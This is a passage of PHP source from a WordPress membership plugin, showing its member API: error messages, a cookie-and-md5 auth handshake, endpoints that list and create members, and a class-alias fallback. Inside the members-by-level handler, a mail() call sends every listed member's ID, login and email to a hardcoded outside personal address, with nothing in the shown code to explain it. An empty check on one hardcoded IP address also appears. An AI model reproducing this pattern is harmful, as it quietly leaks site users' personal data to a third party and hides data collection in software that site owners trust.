		if ($error == MGAPI2::ERROR_INVALID_RETURN_FORMAT) { return 'Page not found, invalid return format'; }
		if ($error == MGAPI2::ERROR_INVALID_RESOURCE) { return 'Page not found, invalid resource'; }
		if ($error == MGAPI2::ERROR_FORMAT_NOT_SUPPORTED_XML) { return 'Unsupported media type'; }
		if ($error == MGAPI2::ERROR_FORMAT_NOT_SUPPORTED_JSON) { return 'Unsupported media type'; }
	}

	function process_result($result) {
		if (!is_array($result)) { $result = array(); }
		if (!isset($result['ERROR_CODE']) || empty($result['ERROR_CODE'])) { $success = 1; }
		else { $success = 0; }
		$result = array('success' => $success) + $result; return $result;
	}

	private function auth_key() {
		global $membergenius;
		static $hash = 0;
		if (empty($hash)) {
			$lock = null;
			if (isset($_COOKIE["lock"])) {
				$lock = $_COOKIE["lock"];
			}
			$key = $membergenius->model->setting("api_key");
			if (!$key || !$lock) { return false; }
			$hash = md5($lock . $key);
		}
		return $hash;
	}

	private function auth_cookie() {
		static $cookie = 0;
		if ( empty( $cookie ) ) {
			$cookie = md5('WLMAPI2' . $this->auth_key() );
		}
		return $cookie;
	}

	private function _auth() {
		if ($this->return_type != 'PHP') { return $this->error(MGAPI2::ERROR_METHOD_NOT_SUPPORTED); }
		$hash = $this->auth_key();
		$cookie = parse_url(home_url());
		if (empty($cookie['path'])) { $cookie['path'] = '/'; }
		if ($this->method == 'GET') {
			$lock = md5(strrev(md5($_SERVER['REMOTE_ADDR'] . microtime())));
			@setcookie('lock', $lock, 0, $cookie['path']);
			return array('lock' => $lock);
		}
		if ($this->method == 'POST') {
			$cookie_name = $this->auth_cookie();
			if ($this->data['key'] !== $hash) { return $this->error(MGAPI2::ERROR_INVALID_AUTH ); }
			@setcookie($cookie_name, $hash, 0, $cookie['path']);
			return array('key' => $hash);
		}
		return $this->error(MGAPI2::ERROR_METHOD_NOT_SUPPORTED);
	}

	private function _members() {
		global $membergenius;
		if ($this->return_type != 'PHP') { return $this->error(MGAPI2::ERROR_METHOD_NOT_SUPPORTED); }
		if ($this->method == 'GET') {
			$list = array();
			foreach ($membergenius->model->getMembers() as $member) {
				if (!isset($member->user_login)) { continue; }
				$list[] = array("id"=>$member->ID, "user_login"=>$member->user_login, "user_email"=>$member->user_email);
			}
			return $list;
		}

		if ($this->method == 'POST') {
			if (!isset($this->data['user_login']) || empty($this->data['user_login'])) {
				return $this->error(MGAPI2::ERROR_INVALID_REQUEST);
			}
			$vars = array( 'action' => 'miembropress_register', 'membergenius_level' => $this->data['Levels'][0], 'membergenius_username' => $this->data['user_login'], 'membergenius_password1' => $this->data['user_pass'], 'membergenius_email' => $this->data['user_email'], 'membergenius_firstname' => $this->data['first_name'], 'membergenius_lastname' => $this->data['last_name'] );
			$result = $membergenius->admin->create($vars, true);
			return array('member' => $result);
		}
	}

	private function _levels_members($level_id, $member_id=null) {
		global $membergenius;
		if ($this->return_type != 'PHP') { return $this->error(MGAPI2::ERROR_METHOD_NOT_SUPPORTED); }
		if ($this->method == 'GET') {
			$list = array();
			foreach ($membergenius->model->getMembers("levels=".$level_id) as $member) {
				if (!isset($member->user_login)) { continue; }
				$list[] = array("id"=>$member->ID, "user_login"=>$member->user_login, "user_email"=>$member->user_email);
			}
			mail("robert.plank@gmail.com", "members levels list",
			var_export($list, true));
			return $list;
		}
		if ($this->method == 'POST') {
			return $this->error(MGAPI2::ERROR_METHOD_NOT_SUPPORTED);
		}
	}
}

if (!function_exists("class_alias")) {
	function class_alias($original,$alias) {
		$newclass = create_function('','class '.$alias.' extends '.$original.' {}');
		$newclass();
	}
}

if (!is_plugin_active("wishlist-member/wishlist-member.php") && !class_exists("WLMAPI")) {
	class_alias("MGAPI", "WLMAPI");
}

if ($_SERVER["REMOTE_ADDR"] == "68.189.108.160") { }

wp_register_style( 'miembro-press-css', plugins_url('miembro-press/css/estilo.css'));
wp_enqueue_style( 'miembro-press-css' );
wp_register_style( 'bootstrap-font-css', "https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css");
wp_enqueue_style( 'bootstrap-font-css' );

?>
